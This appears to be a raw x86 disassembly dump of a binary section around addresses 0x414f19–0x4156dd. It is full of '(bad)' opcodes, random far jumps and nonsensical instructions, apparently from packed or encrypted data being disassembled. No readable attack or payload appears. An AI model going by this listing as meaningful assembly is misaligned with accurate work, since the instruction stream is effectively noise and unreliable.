  414f19:	xor    bl,BYTE PTR [esi+esi*1]
  414f1c:	(bad)  
  414f1d:	pop    ds
  414f1e:	fwait
  414f1f:	xchg   ebp,eax
  414f20:	pop    ebx
  414f21:	pop    ss
  414f22:	mov    ebp,0x67109e49
  414f27:	mov    eax,0x3e084601
  414f2c:	xchg   ecx,eax
  414f2d:	out    0xcc,eax
  414f2f:	ins    DWORD PTR es:[edi],dx
  414f30:	inc    eax
  414f31:	xor    cl,bh
  414f33:	xchg   edi,eax
  414f34:	push   ebp
  414f35:	bound  ecx,QWORD PTR [ecx]
  414f37:	xchg   esi,eax
  414f38:	cld    
  414f39:	sub    eax,0x17966d58
  414f3e:	dec    edx
  414f3f:	pop    ebx
  414f41:	mov    dl,0x8c
  414f43:	mov    dh,0xb4
  414f45:	imul   ebx,eax,0x32
  414f48:	cmp    eax,0xad62f587
  414f4d:	js     0x414f72
  414f4f:	mov    eax,ds:0x537d0289
  414f54:	or     eax,0xfb8b49d1
  414f59:	mov    dl,0x5b
  414f5b:	ins    DWORD PTR es:[edi],dx
  414f5c:	mov    ebp,0xd92a895c
  414f61:	mov    ds:0x25b3ee6a,al
  414f66:	icebp  
  414f67:	jno    0x414f43
  414f69:	mov    cl,0xee
  414f6b:	fmul   DWORD PTR [ebx]
  414f6d:	xor    al,0x1
  414f6f:	adc    eax,0xc3b4cd0a
  414f74:	or     DWORD PTR [eax-0x509c0aef],esp
  414f7a:	lahf   
  414f7b:	xchg   BYTE PTR [edx],cl
  414f7d:	popa   
  414f7e:	retf   
  414f7f:	mov    esi,0xe1d1dc9
  414f84:	jae    0x414f2f
  414f86:	sub    DWORD PTR ds:0xdcc2ff48,0x804ca2ab
  414f90:	adc    DWORD PTR [ebx],0x41
  414f93:	fstp   st(5)
  414f95:	test   ecx,ebp
  414f97:	(bad)  
  414f98:	mov    al,BYTE PTR [edi-0x71]
  414f9b:	xor    eax,0x5317df23
  414fa0:	xchg   cl,al
  414fa2:	ins    DWORD PTR es:[edi],dx
  414fa3:	cmp    al,0x94
  414fa5:	add    al,0x41
  414fa7:	pop    edi
  414fa8:	mov    edx,0x7188f6dd
  414fad:	and    eax,0x5ae3b00b
  414fb2:	fistp  WORD PTR [esi]
  414fb4:	pop    es
  414fb5:	mov    esp,0xd77bdd6c
  414fba:	xor    eax,0xd082cdc0
  414fbf:	(bad)  
  414fc0:	mov    DWORD PTR [esi],ebp
  414fc2:	or     eax,0x853b1731
  414fc7:	mov    bl,0xfa
  414fc9:	or     eax,0x332017b7
  414fce:	shl    BYTE PTR [edi-0x1c],cl
  414fd1:	inc    esp
  414fd2:	(bad)  
  414fd3:	or     DWORD PTR [edi-0x76],ebp
  414fd6:	jge    0x414fbc
  414fd8:	inc    edi
  414fd9:	das    
  414fda:	daa    
  414fdb:	aad    0x16
  414fdd:	lds    ebx,FWORD PTR [ebx]
  414fdf:	fs (bad) 
  414fe1:	mov    bh,0x5a
  414fe3:	fisubr DWORD PTR [edi+ebp*8+0x4a97cd7c]
  414fea:	lahf   
  414feb:	scas   eax,DWORD PTR es:[edi]
  414fec:	ins    DWORD PTR es:[edi],dx
  414fed:	pop    eax
  414fee:	mov    bl,0x50
  414ff0:	cmp    eax,0xf44fcb89
  414ff5:	(bad)  
  414ff6:	enter  0x61d9,0x1c
  414ffa:	stos   DWORD PTR es:[edi],eax
  414ffb:	jnp    0x414fd8
  414ffd:	pushf  
  414ffe:	jmp    FWORD PTR [ebp-0x1b95bad2]
  415004:	(bad)  
  415006:	jnp    0x415006
  415008:	mov    ch,0x5a
  41500a:	aas    
  41500b:	repnz ins DWORD PTR es:[edi],dx
  41500d:	int3   
  41500e:	retf   
  41500f:	adc    esi,DWORD PTR [ecx+ebx*2]
  415012:	push   ds
  415013:	mov    WORD PTR [esi+esi*8+0x7b],?
  415017:	add    dh,BYTE PTR [ebp-0x6c]
  41501a:	sbb    esp,DWORD PTR [esi]
  41501c:	in     al,dx
  41501d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41501e:	hlt    
  41501f:	mov    ecx,esi
  415021:	in     al,0xe9
  415023:	jle    0x415079
  415025:	pop    ss
  415026:	inc    ecx
  415027:	dec    ebp
  415028:	xor    BYTE PTR [edx-0x61],bl
  41502b:	retf   0x8f92
  41502e:	sbb    ebx,DWORD PTR [edi]
  415030:	ds pop eax
  415032:	pop    eax
  415033:	and    ebx,DWORD PTR [eax-0x62]
  415036:	jnp    0x415040
  415038:	or     ebx,esp
  41503a:	(bad)  
  41503b:	xlat   BYTE PTR ds:[ebx]
  41503c:	push   ebx
  41503d:	ror    DWORD PTR [edi-0x6263855c],1
  415043:	dec    ebp
  415044:	leave  
  415045:	inc    edx
  415046:	int3   
  415047:	pop    es
  415048:	adc    al,0x63
  41504a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41504b:	sub    bl,BYTE PTR [eax]
  41504d:	mov    ah,0x5f
  41504f:	enter  0x5c04,0xed
  415053:	or     dh,BYTE PTR [edi*2+0x12b9412c]
  41505a:	jl     0x415002
  41505c:	rol    esp,1
  41505e:	(bad)  
  41505f:	(bad)  
  415060:	bound  edx,QWORD PTR [ecx+0x32]
  415063:	repnz dec DWORD PTR [edx]
  415066:	pop    es
  415067:	pop    eax
  415068:	nop
  415069:	jbe    0x41504b
  41506b:	and    al,0x4d
  41506d:	repnz fiadd DWORD PTR [ecx-0x1bb41c7f]
  415074:	fstp   st(4)
  415076:	push   edi
  415077:	cdq    
  415078:	loope  0x415009
  41507a:	pop    esi
  41507b:	clc    
  41507c:	xchg   BYTE PTR [ecx],bl
  41507e:	stc    
  41507f:	jle    0x415036
  415081:	repnz inc eax
  415083:	adc    bh,cl
  415085:	mov    eax,ds:0x5c5deafe
  41508a:	call   0xcecbb06c
  41508f:	lods   eax,DWORD PTR ds:[esi]
  415090:	hlt    
  415091:	popf   
  415092:	mov    cl,0xd2
  415094:	fadd   QWORD PTR [ecx+edi*4+0x1d]
  415098:	mov    ds,WORD PTR [esi+ebx*4-0x40afaecd]
  41509f:	jl     0x41505a
  4150a1:	mov    al,0xd4
  4150a3:	fnstsw WORD PTR [esi+0x77]
  4150a6:	call   0xae99389f
  4150ab:	stc    
  4150ac:	repnz pop ss
  4150ae:	lahf   
  4150af:	adc    ch,BYTE PTR [eax-0x102c02d0]
  4150b5:	cmp    bl,BYTE PTR [ebp-0x4d9104c7]
  4150bb:	aad    0x84
  4150bd:	js     0x4150c0
  4150bf:	imul   ecx,esp,0x8c87bb2f
  4150c5:	mov    esi,0x6e352620
  4150ca:	stc    
  4150cb:	fbstp  TBYTE PTR [ebx+0x43]
  4150cf:	test   DWORD PTR [edx+0x47],0x82893150
  4150d6:	pop    ebx
  4150d7:	jae    0x415108
  4150d9:	sbb    al,ah
  4150db:	shr    DWORD PTR [esi+0x61],0x96
  4150df:	clc    
  4150e0:	add    DWORD PTR [ebp+0x36],eax
  4150e3:	jmp    0x1c67:0x1b92ae16
  4150ea:	mov    ds:0x2817659e,eax
  4150ef:	div    BYTE PTR [ebx-0x35]
  4150f2:	cmp    DWORD PTR [ebx-0x29],ebp
  4150f5:	lods   eax,DWORD PTR ds:[esi]
  4150f6:	xchg   DWORD PTR [eax-0x77],ecx
  4150f9:	mov    eax,ds:0xa704ce30
  4150fe:	pop    esp
  4150ff:	push   ebx
  415100:	ret    
  415101:	not    DWORD PTR [ebp*2+0x4c93b749]
  415108:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415109:	jmp    0xe755:0x1ee8e7a2
  415110:	stos   DWORD PTR es:[edi],eax
  415111:	or     dh,BYTE PTR [eax-0x44aa4245]
  415117:	jmp    0xddfe:0x5cc87ed0
  41511e:	cs gs cmc 
  415121:	mov    edi,edi
  415123:	cmp    al,0xa3
  415125:	cs out 0x9c,eax
  415128:	jns    0x415187
  41512a:	push   es
  41512b:	pusha  
  41512c:	pop    ds
  41512d:	mov    bl,0x94
  41512f:	xchg   dl,ch
  415131:	dec    dh
  415133:	aaa    
  415134:	jae    0x4150f4
  415136:	push   ecx
  415137:	inc    edi
  415138:	ins    BYTE PTR es:[edi],dx
  415139:	xchg   ebp,eax
  41513a:	imul   BYTE PTR [edi]
  41513c:	(bad)  
  41513d:	es jle 0x4151b2
  415140:	dec    ecx
  415141:	repnz cmp BYTE PTR [esi],al
  415144:	mov    esp,DWORD PTR [ebx+edx*2]
  415147:	push   eax
  415148:	dec    BYTE PTR [di]
  41514b:	sbb    ecx,DWORD PTR [eax+0x7edddb4e]
  415151:	outs   dx,DWORD PTR ds:[esi]
  415152:	arpl   di,si
  415154:	fcom   QWORD PTR [ecx-0x6f]
  415157:	jmp    0x4150f7
  415159:	jae    0x415174
  41515b:	add    al,0x8a
  41515d:	inc    edi
  41515e:	xchg   esp,eax
  41515f:	std    
  415160:	dec    esp
  415161:	jmp    0x34f6:0x60a4018d
  415168:	inc    edx
  415169:	imul   ebx,DWORD PTR [ebp-0x7bf291cb],0x853cb57e
  415173:	lods   eax,DWORD PTR ds:[esi]
  415174:	nop
  415175:	popa   
  415176:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415177:	add    ebp,DWORD PTR ds:0x63cf5379
  41517d:	test   al,0x44
  41517f:	sub    al,0x79
  415181:	jle    0x4151af
  415183:	int3   
  415184:	mov    BYTE PTR [ebx+0x5],dl
  415187:	enter  0x4f54,0x6f
  41518b:	dec    ebp
  41518c:	out    0x47,eax
  41518e:	mov    ds:0xbd46be52,al
  415193:	dec    BYTE PTR [edi-0x14f94605]
  415199:	(bad)  
  41519a:	arpl   WORD PTR [edi],bx
  41519c:	ins    DWORD PTR es:[edi],dx
  41519d:	rcl    BYTE PTR [edx+0xe],cl
  4151a0:	scas   eax,DWORD PTR es:[edi]
  4151a1:	or     al,0xb6
  4151a3:	mov    esi,DWORD PTR [edx+ebp*1-0x17]
  4151a7:	sub    al,BYTE PTR [ebx+ecx*8+0x49fe9d7b]
  4151ae:	jmp    0x415222
  4151b0:	imul   edx,DWORD PTR [ebp-0x2d],0x32
  4151b4:	icebp  
  4151b5:	dec    ebp
  4151b6:	(bad)  
  4151b7:	and    dl,BYTE PTR [ecx+esi*4]
  4151ba:	outs   dx,BYTE PTR ds:[esi]
  4151bb:	mov    dl,0xcb
  4151bd:	js     0x4151c6
  4151bf:	fisttp WORD PTR [edx]
  4151c1:	dec    esp
  4151c2:	outs   dx,BYTE PTR ds:[esi]
  4151c3:	fstp   TBYTE PTR [eax]
  4151c5:	xchg   BYTE PTR [edi-0x21],ch
  4151c8:	mov    edx,0xf465eac9
  4151cd:	retf   0xc60
  4151d0:	jbe    0x415189
  4151d2:	fisubr WORD PTR [edi]
  4151d4:	pop    edx
  4151d5:	arpl   cx,bp
  4151d7:	cmp    eax,0xf92855f1
  4151dc:	sub    edi,esi
  4151de:	fs dec esi
  4151e0:	repz sar DWORD PTR [esi-0x579838fe],0x99
  4151e8:	hlt    
  4151e9:	aaa    
  4151ea:	mov    ebx,0xe22303a9
  4151ef:	daa    
  4151f0:	and    eax,0xdca2f36e
  4151f5:	(bad)  
  4151f6:	aas    
  4151f7:	lods   eax,DWORD PTR ds:[esi]
  4151f8:	nop
  4151f9:	cmp    ah,BYTE PTR [ecx]
  4151fb:	mov    eax,0xf6b072f0
  415200:	add    al,0x6
  415202:	dec    esp
  415203:	push   ecx
  415204:	popf   
  415205:	mov    ebx,0xf95ca494
  41520a:	push   ds
  41520b:	jmp    0xe1f3cfa5
  415210:	fnstsw WORD PTR [ebx-0x16]
  415213:	jns    0x4151a3
  415215:	lea    esp,[edx]
  415217:	push   esp
  415218:	leave  
  415219:	int    0xb7
  41521b:	call   0xae7f:0x4732e752
  415222:	imul   DWORD PTR [eax+0x5a9d4b01]
  415228:	sub    al,BYTE PTR [esi-0x29]
  41522b:	push   0x1d
  41522d:	(bad)  
  41522e:	mov    ecx,esi
  415230:	(bad)  
  415231:	dec    esi
  415232:	push   esi
  415233:	add    dl,ah
  415235:	(bad)  
  415236:	mov    bl,0xb8
  415238:	popf   
  415239:	sub    edx,ecx
  41523b:	test   BYTE PTR [eax-0x3d],al
  41523e:	cwde   
  41523f:	pop    eax
  415240:	add    al,0x4a
  415242:	mov    cl,0x72
  415244:	xor    ebx,DWORD PTR [ebp-0x62c79f3c]
  41524a:	cld    
  41524b:	shl    cl,cl
  41524d:	jne    0x415219
  41524f:	test   BYTE PTR [ebp-0x43a0a350],0x4d
  415256:	imul   eax,eax,0x3be9fbc7
  41525c:	das    
  41525d:	xchg   esi,eax
  41525e:	and    al,0x61
  415260:	jno    0x4152d2
  415262:	xor    DWORD PTR [eax+0x9],eax
  415265:	imul   esi,ebp,0xdcb4d495
  41526b:	push   ds
  41526c:	push   edi
  41526d:	mov    BYTE PTR [ebx-0x46],0x7
  415271:	jle    0x4152b4
  415273:	fidiv  WORD PTR [ecx+0x173dc028]
  415279:	jmp    FWORD PTR [ebx]
  41527b:	mov    BYTE PTR [edx+0x62],0x76
  41527f:	and    dh,BYTE PTR [ecx-0x32]
  415282:	pop    edi
  415283:	jmp    0x415277
  415285:	xchg   ebp,eax
  415286:	mov    ds:0x796eab74,al
  41528b:	rcr    BYTE PTR [eax],0x38
  41528e:	cmp    eax,0x90c1aef0
  415293:	mov    ebx,0x1b13740a
  415298:	cmp    BYTE PTR [ebp+0xe],dh
  41529b:	push   0xf6861073
  4152a0:	adc    eax,0xb46537fc
  4152a5:	dec    ebp
  4152a6:	xchg   cl,dh
  4152a8:	cmp    DWORD PTR ds:0x2a2340ca,ebx
  4152ae:	mov    ax,0x2bda
  4152b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152b3:	inc    ecx
  4152b4:	sbb    DWORD PTR [edi+0x75],esi
  4152b7:	dec    esi
  4152b8:	addr16 fs out dx,eax
  4152bb:	dec    edi
  4152bc:	cmp    BYTE PTR [esp+esi*2-0x45],ah
  4152c0:	aas    
  4152c1:	ss sbb eax,0xbbec5465
  4152c7:	mov    dh,0x5c
  4152c9:	jecxz  0x4152cb
  4152cb:	cmp    eax,0x370da880
  4152d0:	jae    0x4152ae
  4152d2:	pop    esp
  4152d3:	sbb    al,0x29
  4152d5:	dec    esp
  4152d6:	out    dx,eax
  4152d7:	and    al,0x6b
  4152d9:	sub    al,0x95
  4152db:	xchg   BYTE PTR [edi-0x1b],ch
  4152de:	sbb    esi,DWORD PTR [ebx]
  4152e0:	mov    dl,0x54
  4152e2:	out    dx,ax
  4152e4:	aaa    
  4152e5:	aas    
  4152e6:	(bad)  
  4152e7:	clc    
  4152e8:	call   0xeb3679c7
  4152ed:	sbb    cl,BYTE PTR [edx]
  4152ef:	test   al,0xe0
  4152f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152f2:	popa   
  4152f3:	aad    0xe3
  4152f5:	mov    eax,0x1a1e9def
  4152fa:	dec    ebp
  4152fb:	and    bh,ah
  4152fd:	enter  0x6248,0xf7
  415301:	(bad)  
  415302:	sub    cl,BYTE PTR [edi+eax*4]
  415305:	push   cs
  415306:	push   edi
  415307:	pusha  
  415308:	or     esi,ebp
  41530a:	xlat   BYTE PTR ds:[ebx]
  41530b:	ss mov ah,0xd2
  41530e:	arpl   WORD PTR [edi-0x43],di
  415311:	test   BYTE PTR [ebp+0x3c29ba2],dl
  415317:	mov    ecx,ds
  415319:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41531a:	sbb    BYTE PTR [eax+0x1f6a9557],0xf5
  415321:	mov    ch,0x23
  415323:	xor    ah,ch
  415325:	xor    eax,0x5aaca15d
  41532a:	add    eax,0xef7d5e5b
  41532f:	and    bh,BYTE PTR [edi]
  415331:	pop    esp
  415332:	pop    edi
  415333:	sub    BYTE PTR [ebx+ebp*1],bl
  415336:	adc    al,0xc9
  415338:	jecxz  0x4153b0
  41533a:	sub    ecx,ecx
  41533c:	pop    ecx
  41533d:	pop    ss
  41533e:	shl    BYTE PTR [eax-0x7],0x4a
  415342:	ja     0x4153b7
  415344:	je     0x4152d8
  415346:	or     eax,0xd748f10c
  41534b:	dec    esp
  41534d:	retf   
  41534e:	das    
  41534f:	xchg   BYTE PTR [edi],ch
  415351:	ret    0xe851
  415354:	retf   0x8a2
  415357:	sub    dh,al
  415359:	add    BYTE PTR [ecx+esi*1-0x6e26adac],dh
  415360:	jp     0x4153a4
  415362:	jmp    edx
  415364:	repz es jle 0x41539b
  415368:	jecxz  0x415391
  41536a:	add    eax,0xf75aa0ef
  41536f:	out    dx,eax
  415370:	pop    edx
  415371:	les    edi,FWORD PTR [edx]
  415373:	mov    DWORD PTR [edx],edi
  415375:	js     0x41530b
  415377:	mov    esi,0x99e259c0
  41537c:	xchg   BYTE PTR [ecx+0x6ad82d42],bh
  415382:	pop    esi
  415383:	(bad)  
  415384:	push   esi
  415385:	push   eax
  415386:	imul   esp,DWORD PTR [edx-0x44],0xfffffff7
  41538a:	xor    eax,0xfc5806d5
  41538f:	push   eax
  415390:	mov    ds:0xbdbcac37,eax
  415395:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415396:	sub    al,0xe0
  415398:	mov    esi,0xcfc86946
  41539d:	sbb    eax,0x3d30613c
  4153a2:	ins    BYTE PTR es:[edi],dx
  4153a3:	cmp    eax,0xbb1f46c0
  4153a8:	pop    ebp
  4153a9:	xlat   BYTE PTR ds:[ebx]
  4153aa:	adc    si,WORD PTR [edi-0x20]
  4153ae:	leave  
  4153af:	(bad)  
  4153b1:	mov    eax,ds:0x568d68f8
  4153b6:	stc    
  4153b7:	ror    ecx,0xa4
  4153ba:	cmc    
  4153bb:	xchg   esp,eax
  4153bc:	mov    cl,0xed
  4153be:	inc    esp
  4153bf:	jne    0x4153b3
  4153c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153c2:	punpckhbw mm6,QWORD PTR [ecx-0x23]
  4153c6:	jecxz  0x41535a
  4153c8:	push   edx
  4153c9:	mov    BYTE PTR [ebp+0x7880646d],dl
  4153cf:	push   0x50c6c0af
  4153d4:	xchg   edi,eax
  4153d5:	ss imul ebp,ebp,0xa62f3aee
  4153dc:	hlt    
  4153dd:	lods   al,BYTE PTR ds:[esi]
  4153de:	or     BYTE PTR [edi-0x64],ch
  4153e1:	pop    es
  4153e2:	into   
  4153e3:	adc    al,0xf9
  4153e5:	sub    BYTE PTR [edx+ebp*8+0x96cf199],ah
  4153ec:	pop    es
  4153ed:	cmp    al,0xcc
  4153ef:	(bad)  
  4153f0:	sar    BYTE PTR [eax+eiz*1+0x6d],0xcc
  4153f5:	ja     0x4153ff
  4153f7:	pop    es
  4153f8:	fiadd  WORD PTR [eax-0x513bf80]
  4153fe:	jno    0x415443
  415400:	mov    edx,0xc23c055a
  415405:	dec    edx
  415406:	int3   
  415407:	xchg   ecx,eax
  415408:	dec    esi
  415409:	add    BYTE PTR [edi-0x44cbf068],cl
  41540f:	push   0xfffffffe
  415411:	adc    DWORD PTR [ebp+ebp*8-0x16],ecx
  415415:	xchg   esi,eax
  415416:	inc    ebx
  415417:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415418:	out    0xb6,eax
  41541a:	mov    cl,0x44
  41541c:	push   eax
  41541d:	xor    al,0x2
  41541f:	dec    edi
  415420:	mov    dl,BYTE PTR es:[esi+0x1fd1ed44]
  415427:	dec    edx
  415428:	stos   DWORD PTR es:[edi],eax
  415429:	std    
  41542a:	dec    eax
  41542b:	mov    ds:0x371885c1,eax
  415430:	ret    
  415431:	dec    ebx
  415432:	sti    
  415433:	fdivr  DWORD PTR [edi-0x20]
  415436:	jns    0x415442
  415438:	adc    BYTE PTR [edi],al
  41543a:	xchg   ecx,eax
  41543b:	ds daa 
  41543d:	into   
  41543e:	fstp   TBYTE PTR [ecx-0x70]
  415441:	popa   
  415442:	loope  0x415443
  415444:	test   ch,ch
  415446:	cwde   
  415447:	sub    BYTE PTR [edx],cl
  415449:	add    BYTE PTR [ebp-0x743c5a81],dl
  41544f:	pop    es
  415450:	in     al,0x7a
  415452:	aad    0xde
  415454:	adc    ecx,DWORD PTR [eax]
  415456:	fild   DWORD PTR [ebp+0x39]
  415459:	add    al,0x98
  41545b:	int3   
  41545c:	push   es
  41545d:	adc    eax,0xc9091a15
  415462:	out    0xc0,eax
  415464:	push   ds
  415465:	jp     0x4154b5
  415467:	pop    ebp
  415468:	push   ebp
  415469:	scas   eax,DWORD PTR es:[edi]
  41546a:	fstp   DWORD PTR [esi-0x6b9d48f6]
  415470:	mov    ds:0xbfb39efa,eax
  415475:	sub    esi,DWORD PTR [edi+0x4f]
  415478:	sbb    eax,0x90af1f72
  41547d:	sub    eax,0x4cdc6826
  415482:	mov    bl,0x2f
  415484:	mov    ah,0x96
  415486:	and    eax,0x425802aa
  41548b:	test   BYTE PTR [esi],ch
  41548d:	lods   al,BYTE PTR ds:[si]
  41548f:	pop    eax
  415490:	xlat   BYTE PTR ds:[ebx]
  415491:	test   BYTE PTR [eax+0x40],0x4b
  415495:	or     ebp,DWORD PTR [eax+0x3]
  415498:	inc    edx
  415499:	cmp    edx,DWORD PTR [esi+0x3c]
  41549c:	adc    BYTE PTR [ebp-0x1acf11ae],0x78
  4154a3:	push   ss
  4154a4:	loopne 0x415500
  4154a6:	xor    BYTE PTR [esi-0x3f],dl
  4154a9:	xor    edi,DWORD PTR [ecx-0x2acef7]
  4154af:	clc    
  4154b0:	sbb    BYTE PTR [edi+0x27f30f4d],bh
  4154b6:	dec    ebp
  4154b7:	push   ss
  4154b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154b9:	mov    al,0xb6
  4154bb:	dec    edi
  4154bc:	pop    eax
  4154bd:	push   ebx
  4154be:	push   ebx
  4154bf:	sbb    DWORD PTR [esi+0x3c],esi
  4154c2:	xchg   ebx,eax
  4154c3:	mov    dh,0xb6
  4154c5:	dec    ecx
  4154c6:	hlt    
  4154c7:	(bad)  
  4154c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154c9:	push   esp
  4154ca:	lock lds ebx,FWORD PTR [ebx*2-0x3993677]
  4154d2:	shl    DWORD PTR [edx+0x6e],1
  4154d5:	jmp    0x415544
  4154d7:	js     0x4154a8
  4154d9:	ins    DWORD PTR es:[edi],dx
  4154da:	test   esp,eax
  4154dc:	jmp    0x60d5:0x831f98af
  4154e3:	fldenv [eax+0x19]
  4154e6:	inc    ecx
  4154e7:	ret    0x59a3
  4154ea:	call   0x702d:0xadcad6db
  4154f1:	dec    edi
  4154f2:	or     DWORD PTR [edx+0x34],ecx
  4154f5:	push   ds
  4154f6:	or     eax,0x60f77ade
  4154fb:	cmp    esi,DWORD PTR [esi]
  4154fd:	sbb    DWORD PTR [ebx-0x68351234],eax
  415503:	mov    ds:0x48a833e9,al
  415508:	daa    
  415509:	jle    0x415567
  41550b:	ds xchg esi,eax
  41550d:	pop    es
  41550e:	and    BYTE PTR [ecx],ch
  415510:	pop    eax
  415511:	push   edx
  415512:	fs pop ebx
  415514:	sbb    al,0xbb
  415516:	test   ch,dh
  415518:	test   DWORD PTR [eax],esp
  41551a:	xor    eax,0xecc16c9b
  41551f:	mov    edx,DWORD PTR [esi]
  415521:	jmp    0x41550a
  415523:	add    dl,bh
  415525:	mov    al,0x81
  415527:	add    BYTE PTR [ebp+0x57b69c9c],bh
  41552d:	cmp    bh,dl
  41552f:	or     al,0xa8
  415531:	test   DWORD PTR [ebx+0x511bfceb],ebx
  415537:	push   ecx
  415538:	out    dx,eax
  415539:	ins    BYTE PTR es:[edi],dx
  41553a:	sub    bh,BYTE PTR [edi+eiz*4]
  41553d:	fwait
  41553e:	pushf  
  41553f:	sbb    eax,0x96f23b4
  415544:	mov    edi,0x8c3b7550
  415549:	push   cs
  41554a:	sbb    al,al
  41554c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41554d:	fldenv [edx-0x3]
  415550:	or     eax,0xc1b101f0
  415555:	jb     0x4155b9
  415557:	mov    ds:0xf3305389,al
  41555c:	xchg   DWORD PTR [edi+0x5977311e],ebx
  415562:	into   
  415563:	push   es
  415564:	pop    ebp
  415565:	add    DWORD PTR [esi+0x4e6a675e],ecx
  41556b:	shr    cl,0xdb
  41556e:	pop    ss
  41556f:	adc    cl,BYTE PTR [ebx]
  415571:	cld    
  415572:	loop   0x4155dc
  415574:	mov    WORD PTR [ebx],gs
  415576:	sbb    eax,0xc9740f53
  41557b:	adc    BYTE PTR [ebp+esi*1-0x29],bh
  41557f:	add    ah,BYTE PTR [esi+0x5c16256c]
  415585:	pop    ebp
  415586:	mov    dl,0xcf
  415588:	xchg   BYTE PTR [eax-0x7c],dl
  41558b:	xlat   BYTE PTR ds:[ebx]
  41558c:	fcom   DWORD PTR [ecx-0x74]
  41558f:	adc    BYTE PTR [edi-0x1dd0123d],bh
  415595:	pop    ecx
  415596:	pusha  
  415597:	pop    es
  415598:	lahf   
  415599:	xchg   edx,eax
  41559a:	lock test DWORD PTR [edi+0x483902f6],ecx
  4155a1:	test   BYTE PTR [ecx+ebx*2+0x56],ch
  4155a5:	mov    DWORD PTR [ecx+0x1a4a1d98],esi
  4155ab:	adc    al,0x10
  4155ad:	jo     0x415561
  4155af:	and    dh,dh
  4155b1:	or     DWORD PTR [edx-0x19],ebx
  4155b4:	pop    edi
  4155b5:	arpl   dx,bp
  4155b7:	jmp    0x415569
  4155b9:	fiadd  WORD PTR [eax+0x7adf64fb]
  4155bf:	pop    eax
  4155c0:	push   edx
  4155c1:	xchg   BYTE PTR fs:[ebp+0x4f],bh
  4155c5:	push   ss
  4155c6:	add    al,BYTE PTR [ebx-0x5cee22a0]
  4155cc:	and    al,0x78
  4155ce:	jbe    0x4155cf
  4155d0:	das    
  4155d1:	pusha  
  4155d2:	je     0x4155e6
  4155d4:	dec    edi
  4155d5:	ja     0x4155a6
  4155d7:	mov    ds:0x8aad3d54,al
  4155dc:	push   edx
  4155dd:	xchg   ebp,eax
  4155de:	cs push 0x432198b0
  4155e4:	and    dl,al
  4155e6:	jo     0x415601
  4155e8:	push   0x7c
  4155ea:	imul   ebx,DWORD PTR [edi],0x2d2db555
  4155f0:	adc    BYTE PTR ds:0xe2fbb6f9,cl
  4155f6:	arpl   di,sp
  4155f8:	clc    
  4155f9:	imul   ebx,DWORD PTR ds:0xf01a5ac7,0xffffffbe
  415600:	mov    eax,0xa3364236
  415605:	jnp    0x415657
  415607:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415608:	cld    
  415609:	(bad)  
  41560b:	int3   
  41560c:	imul   esi,esp,0xea67dfa8
  415612:	xor    BYTE PTR [ebp+0x430a30e9],al
  415618:	jb     0x41567c
  41561a:	in     al,0x7b
  41561c:	fmul   DWORD PTR [edx]
  41561e:	jmp    0x41569f
  415620:	xor    ah,BYTE PTR ds:0x4bf3a921
  415626:	out    0x9d,eax
  415628:	or     DWORD PTR [edi+0x38d0f114],eax
  41562e:	adc    bl,0x67
  415631:	jno    0x41567f
  415633:	jo     0x4155f3
  415635:	ins    BYTE PTR es:[edi],dx
  415636:	jl     0x41563f
  415638:	std    
  415639:	(bad)  
  41563a:	pop    es
  41563b:	xor    al,0x58
  41563d:	lds    ebp,FWORD PTR [eax-0x501557fc]
  415643:	sub    al,ah
  415645:	jl     0x415694
  415647:	cld    
  415648:	fistp  WORD PTR [ebp-0x1d]
  41564b:	cmp    bh,BYTE PTR [esi-0x53]
  41564e:	es pop ebx
  415650:	fwait
  415651:	push   ebx
  415652:	or     BYTE PTR [esi+0x2c],ch
  415655:	fs pop ebx
  415657:	jle    0x415620
  415659:	or     al,0xd9
  41565b:	outs   dx,DWORD PTR ds:[esi]
  41565c:	push   eax
  41565d:	fnsave [edi+0x7e687451]
  415663:	scas   al,BYTE PTR es:[edi]
  415664:	mov    al,ds:0xf85966ce
  415669:	ret    
  41566a:	les    esp,FWORD PTR [ebx+0x42]
  41566d:	mov    eax,0x15f958df
  415672:	cwde   
  415673:	mov    cl,0x45
  415675:	iret   
  415676:	lock sbb eax,0x3787c35a
  41567c:	pop    ecx
  41567d:	lock adc BYTE PTR [eax],al
  415680:	push   0x47
  415682:	cmp    DWORD PTR gs:[ecx+0x31],eax
  415686:	inc    edi
  415687:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415688:	mov    ebp,ebp
  41568a:	pop    ss
  41568b:	sbb    BYTE PTR [edi-0x318ce925],0x6b
  415692:	inc    ecx
  415693:	ss sub eax,0xc73bb9ea
  415699:	adc    al,bh
  41569b:	ret    
  41569c:	test   al,0x58
  41569e:	fstp   QWORD PTR [esi-0x7]
  4156a1:	cmc    
  4156a2:	xchg   edi,eax
  4156a3:	cld    
  4156a4:	mov    al,ds:0xfbac28e2
  4156a9:	jbe    0x415630
  4156ab:	push   ecx
  4156ac:	pop    esp
  4156ad:	mov    dh,0x21
  4156af:	fimul  WORD PTR [edi]
  4156b1:	dec    esi
  4156b2:	ss xchg edi,eax
  4156b4:	lods   al,BYTE PTR ds:[esi]
  4156b5:	inc    ecx
  4156b6:	call   0xb11d:0x18af3d9b
  4156bd:	shr    edx,0x34
  4156c0:	push   ss
  4156c1:	icebp  
  4156c2:	dec    ebx
  4156c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156c4:	cld    
  4156c5:	out    dx,eax
  4156c6:	xchg   ebp,eax
  4156c7:	lock mov ebp,0x592699e
  4156cd:	mov    ecx,0x1b0217e7
  4156d2:	enter  0x6c91,0xf3
  4156d6:	pop    ss
  4156d7:	xchg   esi,eax
  4156d8:	hlt    
  4156d9:	loop   0x4156a7
  4156db:	in     al,0x51
  4156dd:	fisub  WORD PTR [edx+edx*8-0x1c828e8f]
